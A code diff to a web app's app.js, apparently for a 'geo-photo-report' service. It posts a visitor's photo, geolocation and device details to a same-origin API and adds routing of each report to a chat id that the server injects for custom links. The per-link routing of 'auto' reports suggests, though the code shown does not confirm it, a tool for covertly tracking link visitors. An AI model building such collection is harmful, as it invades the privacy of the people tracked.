@@ -1,6 +1,6 @@
 // === app.js ===
-// Настройки
-const API_BASE = 'https://geo-photo-report.onrender.com';
+// Настройки: бьём на тот же origin, где открыт сайт
+const API_BASE = ''; // было 'https://geo-photo-report.onrender.com'
 
 // Кэшируем UI
 const UI = {
@@ -100,10 +100,15 @@ function getDeviceInfo() {
 // === Отправка отчёта ===
 async function sendReport({ photoBase64, geo }) {
   const info = getDeviceInfo();
+  const body = { ...info, geo, photoBase64, note: 'auto' };
+
+  // Поддержка кастомных ссылок (/r/:slug) — если сервер внедрил chatId
+  if (window.__TARGET_CHAT_ID) body.chatId = window.__TARGET_CHAT_ID;
+
   const r = await fetch(`${API_BASE}/api/report`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ ...info, geo, photoBase64, note: 'auto' }),
+    body: JSON.stringify(body),
   });
   const data = await r.json();
   if (!data.ok) throw new Error(data.error || 'Send failed');
